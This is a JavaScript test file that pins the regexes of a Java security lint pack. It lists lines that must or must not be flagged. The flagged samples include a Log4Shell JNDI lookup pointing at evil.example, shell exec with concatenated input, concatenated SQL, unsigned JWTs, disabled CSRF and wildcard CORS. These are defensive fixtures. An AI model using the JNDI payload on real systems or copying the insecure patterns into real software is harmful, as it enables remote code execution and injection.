// Regression coverage for the `java` rule-pack patterns, driven through the
// REAL lintCustomRules engine (same harness as invariant-packs.test.mjs).
// Engine mechanics are covered by invariant-lint.test.mjs; this file pins the
// java pack REGEXES so a future edit that breaks a security rule (stops
// matching a violation, or starts matching a safe lookalike) fails CI.
//   expect:true  = a violation that MUST be flagged
//   expect:false = a safe line that must NOT be flagged
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import path from "node:path";

import { lintCustomRules } from "./invariant-lint.mjs";

const PACK_PATH = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "..",
  "invariants",
  "packs",
  "java.json",
);

const pack = JSON.parse(readFileSync(PACK_PATH, "utf8"));
const byId = {};
for (const r of pack.rules) byId[r.id] = r;

// Compile one pack rule into the engine's internal shape. includes is /.*/ so
// the filename gate is a no-op — these cases exercise the pattern + window,
// not glob routing (the engine test already covers that).
function compiled(ruleId) {
  const r = byId[ruleId];
  assert.ok(r, `rule ${ruleId} must exist in the java pack`);
  return {
    id: r.id,
    level: String(r.severity || "warn").toLowerCase() === "hard" ? "HARD" : "WARN",
    includes: [/.*/],
    excludes: [],
    regex: new RegExp(r.pattern, r.flags || ""),
    message: r.message,
  };
}

function flagged(ruleId, file, text) {
  const findings = [];
  const lines = text.split("\n").map((t, i) => ({ line: i + 1, text: t, added: true }));
  lintCustomRules(file, lines, [compiled(ruleId)], findings);
  return findings.length > 0;
}

// [ruleId, file, line, expectFlagged]
const CASES = [
  // -- Log4Shell JNDI lookup -------------------------------------------------
  ["java-log4shell-jndi-lookup", "A.java", 'String p = "${jndi:ldap://evil.example/a}";', true],
  ["java-log4shell-jndi-lookup", "A.java", 'logger.error("${jndi:rmi://x/y}");', true],
  ["java-log4shell-jndi-lookup", "A.java", 'String home = "${user.home}/config";', false],
  ["java-log4shell-jndi-lookup", "A.java", 'String v = "${env:PATH}";', false],

  // -- Runtime.exec string concatenation -------------------------------------
  ["java-runtime-exec-string-concat", "A.java", 'Runtime.getRuntime().exec("ping " + host);', true],
  ["java-runtime-exec-string-concat", "A.java", 'p.exec("/bin/sh -c " + cmd);', true],
  ["java-runtime-exec-string-concat", "A.java", 'Runtime.getRuntime().exec(new String[]{"ping", host});', false],
  ["java-runtime-exec-string-concat", "A.java", 'Runtime.getRuntime().exec("ls -la");', false],

  // -- Runtime.exec bare (warn) ----------------------------------------------
  ["java-runtime-exec-bare", "A.java", "Process p = Runtime.getRuntime().exec(cmd);", true],
  ["java-runtime-exec-bare", "A.java", 'ProcessBuilder pb = new ProcessBuilder("ls", "-la");', false],

  // -- Native deserialization (warn) -----------------------------------------
  ["java-native-deserialization", "A.java", "ObjectInputStream ois = new ObjectInputStream(in);", true],
  ["java-native-deserialization", "A.java", "var bis = new ByteArrayInputStream(bytes);", false],

  // -- Jackson enableDefaultTyping (hard) ------------------------------------
  ["java-jackson-enable-default-typing", "A.java", "mapper.enableDefaultTyping();", true],
  ["java-jackson-enable-default-typing", "A.java", "mapper.enable(SerializationFeature.INDENT_OUTPUT);", false],

  // -- Jackson activateDefaultTyping (warn) ----------------------------------
  ["java-jackson-activate-default-typing", "A.java", "mapper.activateDefaultTyping(ptv);", true],
  ["java-jackson-activate-default-typing", "A.java", "mapper.registerModule(new JavaTimeModule());", false],

  // -- CORS wildcard origin (hard) -------------------------------------------
  ["java-cors-wildcard-origin", "A.java", '@CrossOrigin(origins = "*")', true],
  ["java-cors-wildcard-origin", "A.java", '@CrossOrigin("*")', true],
  ["java-cors-wildcard-origin", "A.java", '@CrossOrigin(origins = {"*"})', true],
  ["java-cors-wildcard-origin", "A.java", '@CrossOrigin(origins = "https://app.example.com")', false],

  // -- CORS bare annotation (warn) -------------------------------------------
  ["java-cors-annotation-bare", "A.java", "@CrossOrigin", true],
  ["java-cors-annotation-bare", "A.java", '@CrossOrigin(origins = "https://app.example.com")', false],
  ["java-cors-annotation-bare", "A.java", '@CrossOrigin("*")', false],

  // -- Spring Security CSRF disabled (warn) ----------------------------------
  ["java-spring-csrf-disabled", "A.java", "http.csrf().disable();", true],
  ["java-spring-csrf-disabled", "A.java", "http.csrf(csrf -> csrf.disable());", true],
  ["java-spring-csrf-disabled", "A.java", "http.csrf(AbstractHttpConfigurer::disable);", true],
  ["java-spring-csrf-disabled", "A.java", "http.csrf(Customizer.withDefaults());", false],

  // -- SQL string concatenation (hard) ---------------------------------------
  ["java-sql-string-concat", "A.java", 'em.createQuery("FROM User WHERE id = " + id);', true],
  ["java-sql-string-concat", "A.java", 'conn.prepareStatement("DELETE FROM t WHERE k = " + key);', true],
  ["java-sql-string-concat", "A.java", 'em.createNativeQuery("SELECT * FROM u WHERE id = " + id);', true],
  ["java-sql-string-concat", "A.java", 'conn.prepareStatement("SELECT * FROM u WHERE id = ?");', false],
  ["java-sql-string-concat", "A.java", 'em.createQuery("FROM User WHERE id = :id").setParameter("id", id);', false],

  // -- JWT none algorithm (hard) ---------------------------------------------
  ["java-jwt-none-algorithm", "A.java", "Jwts.builder().signWith(SignatureAlgorithm.NONE, key);", true],
  ["java-jwt-none-algorithm", "A.java", "Jwts.builder().signWith(SignatureAlgorithm.HS256, key);", false],

  // -- JWT unsigned parse (warn) ---------------------------------------------
  ["java-jwt-unsigned-parse", "A.java", "Jwts.parser().parseClaimsJwt(token);", true],
  ["java-jwt-unsigned-parse", "A.java", "Jwts.parser().setSigningKey(key).parseClaimsJws(token);", false],

  // -- XML factory XXE (warn) ------------------------------------------------
  ["java-xml-factory-xxe", "A.java", "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();", true],
  ["java-xml-factory-xxe", "A.java", "XMLInputFactory xif = XMLInputFactory.newInstance();", true],
  ["java-xml-factory-xxe", "A.java", "TransformerFactory tf = TransformerFactory.newInstance();", false],
];

for (const [ruleId, file, line, expect] of CASES) {
  const verb = expect ? "flags" : "ignores";
  test(`${ruleId}: ${verb} ${JSON.stringify(line)}`, () => {
    assert.equal(flagged(ruleId, file, line), expect);
  });
}

// Every rule must have at least one positive and one negative case, and every
// pattern must compile with its declared flags.
test("every java rule has a positive and a negative case", () => {
  for (const id of Object.keys(byId)) {
    const cases = CASES.filter(([rid]) => rid === id);
    assert.ok(
      cases.some(([, , , e]) => e === true),
      `rule ${id} needs at least one positive (flagged) case`,
    );
    assert.ok(
      cases.some(([, , , e]) => e === false),
      `rule ${id} needs at least one negative (ignored) case`,
    );
  }
});

test("all java pack rules compile", () => {
  for (const [id, r] of Object.entries(byId)) {
    assert.doesNotThrow(
      () => new RegExp(r.pattern, r.flags || ""),
      `rule ${id} regex must compile`,
    );
  }
});
